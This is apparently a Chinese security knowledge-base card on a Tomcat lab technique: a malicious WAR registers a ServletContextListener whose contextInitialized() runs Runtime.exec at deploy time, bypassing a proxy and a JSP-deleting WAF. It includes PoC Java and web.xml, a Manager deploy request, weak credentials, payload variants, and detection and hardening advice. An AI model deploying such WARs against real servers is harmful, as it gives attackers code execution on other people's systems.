---
id: web-java-component-tomcat-war-listener-contextinitialized-deploy-rce
title: Tomcat WAR 部署期自动执行：web.xml 注册 ServletContextListener 的 contextInitialized 直接 Runtime.exec，绕过只放行 /manager/* 的反代与删 JSP 的 WAF
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-war-deploy-listener-contextinitialized-rce
tags:
- tomcat
- war
- listener
- servletcontextlistener
- contextinitialized
- rce
- reverse-proxy
- waf-bypass
- memshell
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-8
  verified_at: '2026-11-08T01:14:38+08:00'
  notes: '核对发现问题但可保留（failed）：PoC 端到端未验证。原文解法二给出完整 EvilContextListener.java（contextInitialized 中 Runtime.getRuntime().exec(touch /tmp/pwned)）与 web.xml 注册 listener，并称打包部署自动执行、靶场到此结束，但未给出 /tmp/pwned 落地截图或该解法专属的回连/执行证据；图05 的 getshell 基本信息（Current User: root）是正解 # 映射加内存马的连接结果，非本 Listener 解法的验证。卡片已诚实标 confidence medium 并自承文中未给落地截图；机制（Servlet 规范部署期回调 contextInitialized 加 Runtime.exec）确定、代码完整可复现，非理论链也非把半链包装成攻击面，故不删除。但 severity high 与 tags rce 相对证据强度偏高，且命中 confidence medium 且无成功执行证据的重点检查项，按有问题可保留标 failed，建议补充部署期执行证据或下调结论强度。原理、触发条件、类名、命令、路径 web/java/component/tomcat 与原文一致。dedup_review 成立：4 个 related（standardcontext-servlet-memshell、websocket-endpoint-memshell、cve-2017-12615-put-jsp、xml-digester-setter-jndi）均需先有代码执行或机制不同，listener-memshell 为运行时反射注入方向相反；duplicate 为自匹配，dup-scan 无涉及本篇 pair。affected_versions=null 合理。'
url: /docs/web/java/component/tomcat/web-java-component-tomcat-war-listener-contextinitialized-deploy-rce/
draft: false
kb_aliases:
- Tomcat WAR 部署 RCE
- ServletContextListener 后门
- contextInitialized 命令执行
- '@WebListener 注解部署执行'
- 无需访问路径的 WAR getshell
---

## 一句话结论

在只能把 `/manager/*` 转发给 Tomcat、且 WAF 会删除落盘 JSP 的靶场里，可在恶意 WAR 的 `WEB-INF/web.xml` 注册一个 `ServletContextListener`（或用 `@WebListener` 注解），其 `contextInitialized()` 在应用部署/启动阶段由容器自动调用，直接执行 `Runtime.getRuntime().exec(...)`；代码在部署瞬间就以 Tomcat 进程权限执行，不需要通过 HTTP 访问任何应用路径，因此绕过了"只能访问 /manager/*"的反向代理限制与"删除 .jsp 文件"的 WAF。

## 原理

- **Servlet 规范保证的回调时机**：Web 应用启动时，容器会实例化并回调所有 `ServletContextListener` 的 `contextInitialized(ServletContextEvent)`；停止时回调 `contextDestroyed()`。这是规范行为，不依赖任何 URL 映射、不需要请求进入该应用，也不要求应用里存在可访问的 Servlet/JSP。
- **为什么能绕过反代与 WAF**：反向代理只放行 `/manager/*` 意味着攻击者部署的应用 URL 可能永远无法从外部访问，常规 JSP WebShell 因此失效；WAF 实时监控并删除落盘的 `.jsp` 文件，使文件型 WebShell 也失效。而 Listener 代码在**部署阶段**（WAR 被解压、Context 启动）就被执行，执行发生在容器内部、早于任何 HTTP 访问，也不需要磁盘上保留 JSP 文件——两个限制都被绕开。
- **代码执行权限**：`Runtime.getRuntime().exec()` 以 Tomcat/JVM 进程用户身份执行（靶场为 root），可写文件、反弹 shell、注入内存马等；文中以 `touch /tmp/pwned` 作为最小验证。
- **为什么不是内存马注入**：`tomcat-listener-memshell` 类卡片是"已能执行一次代码后，反射调用 `StandardContext.addApplicationEventListener()` 动态注册监听器"以持久化；本卡是"在 WAR 里静态声明 Listener，靠部署事件触发执行"，是取得首次代码执行的入口，方向与前置条件不同。
- **成立条件**：能向 Tomcat 部署 WAR（Manager 弱口令/凭据或可写 appBase）、`web.xml`/注解被解析（metadata-complete 未禁用注解扫描时 `@WebListener` 也生效）、容器允许应用启动回调 Listener。

## 触发条件

- 攻击者能上传并部署 WAR 到 Tomcat（Manager 部署接口或可写 appBase）。
- 部署后应用路径不可从外部访问（反代只放行固定前缀），或落盘 JSP 会被 WAF/文件监控删除，导致常规 WebShell 不可用。
- Tomcat 正常解析 `WEB-INF/web.xml` 中的 `<listener>`（或扫描 `@WebListener`），并在 Context 启动时回调。
- 目标 JVM 未用 SecurityManager/策略禁止 `Runtime.exec`，且进程权限足够。

## 利用步骤

1. 取得 WAR 部署能力（如 Manager 弱口令 `tomcat/123456` 登录）。
2. 编写实现 `ServletContextListener` 的类，在 `contextInitialized()` 中放入要执行的命令（写文件、反弹 shell 或注入内存马）。
3. 在 WAR 的 `WEB-INF/web.xml` 用 `<listener><listener-class>...` 注册（或给类加 `@WebListener` 注解并确保注解扫描开启）。
4. 打包为 WAR，通过 Manager 部署；无需关心 WAR 文件名/上下文路径是否可从外部访问。
5. 部署完成即触发 RCE；用带外通道（DNSLog/HTTP 回连）或靶标上的文件/进程变化确认执行结果。

## PoC

目录结构：

```text
evil-listener.war
  └─ WEB-INF/
      ├─ web.xml
      └─ classes/com/evil/EvilContextListener.class
```

`WEB-INF/web.xml`：

```xml
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
    <listener>
        <listener-class>com.evil.EvilContextListener</listener-class>
    </listener>
</web-app>
```

`EvilContextListener.java`：

```java
package com.evil;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.annotation.WebListener;
import java.io.IOException;

@WebListener
public class EvilContextListener implements ServletContextListener {
    @Override
    public void contextInitialized(ServletContextEvent sce) throws IOException {
        Runtime.getRuntime().exec("touch /tmp/pwned");   // 换成回连/内存马注入载荷
    }
    @Override
    public void contextDestroyed(ServletContextEvent sce) { }
}
```

部署（仅示意，关键是能上传 WAR；路径是否可达不影响触发）：

```http
POST /manager/text/deploy?path=/evil-listener HTTP/1.1
Host: <target>
Authorization: Basic <base64(manager-script-凭据)>
Content-Type: application/octet-stream

<WAR 二进制>
```

WAR 一被部署，`contextInitialized()` 即执行。文中未给出 `/tmp/pwned` 落地的截图，故 confidence 标 medium；但该回调时机与 `Runtime.exec` 是 Servlet 规范与 JVM 的确定行为。

## 变体与关联

- **其它部署期执行点**：`ServletContainerInitializer`（SPI `META-INF/services` 自动发现，见 [[web-java-classloader-servletcontainerinitializer-spi-backdoor]]）、`@WebListener` 注解注册、`ServletContextListener` 的 `contextDestroyed()`（停止/重新部署时触发）、注册自定义 `Valve`（Pipeline 组件随 Context 启动加载）、`load-on-startup` Servlet 的 `init()`、`Filter.init()`、`ServletContextAttributeListener` 等。
- **载荷变体**：把 `Runtime.exec` 换成注入 Filter/Listener/Valve 内存马的代码，一次部署即得持久化无文件 WebShell；或写 SSH 公钥、反弹 shell。
- **与同文其它解法**：[[web-java-component-tomcat-war-hash-context-mapping-proxy-bypass]] 是用 `manager#app.war` 让应用落在代理放行路径内以便 HTTP 访问；本卡是完全绕开"必须能访问应用路径"这一前提，两者是互斥/互补解法。WAF 只拦 `.jsp` 时用 `web.xml` 把 `*.x` 映射到 JspServlet 见 [[web-java-component-tomcat-webxml-jsp-servlet-xml-pattern-webshell]]。
- **前置入口**：[[web-java-component-tomcat-manager-basic-weak-auth-war-deploy]]（Manager 弱口令 + WAR 部署基础链）；本卡的增量是"部署期回调取得无需路径可达的 RCE"。
- **区别**：[[web-java-component-tomcat-listener-memshell]]、[[web-java-component-tomcat-valve-memshell]] 是运行时反射注入（需先有代码执行），本卡是静态声明、部署即执行。

## 检测与防御

- **认证与部署管控**：同 WAR 部署类通用加固——禁用弱口令、限制 Manager 访问来源、移除生产环境 manager 应用、审计 appBase 下新增 WAR。
- **WAR 内容检测**：上传前静态扫描 WAR 内的 `WEB-INF/web.xml`（`<listener>`、`load-on-startup`、自定义 Servlet 映射、`JspServlet` 映射）与 class 文件中的 `Runtime.exec`/`ProcessBuilder`/反射注册内存马调用；拒绝或隔离含可疑 Listener/Initializer 的 WAR。
- **运行时检测**：监控应用启动阶段新增的 `ServletContextListener`/`Valve`/`Filter` 实例、异常子进程（`Runtime.exec` 派生的 sh/curl/bash）、以及部署瞬间发生的带外连接；用 Arthas/vmtool 枚举并清理可疑监听器（见防御类卡片）。
- **最小权限**：以非 root 低权限用户运行 Tomcat，限制出网，降低部署期 RCE 的影响；启用 SecurityManager/模块权限或容器策略限制 `Runtime.exec`。
- **检测特征**：日志中出现含 `<listener>` 的可疑 WAR、部署后立刻产生子进程或外连、`metadata-complete` 被关闭且存在 `@WebListener` 类。
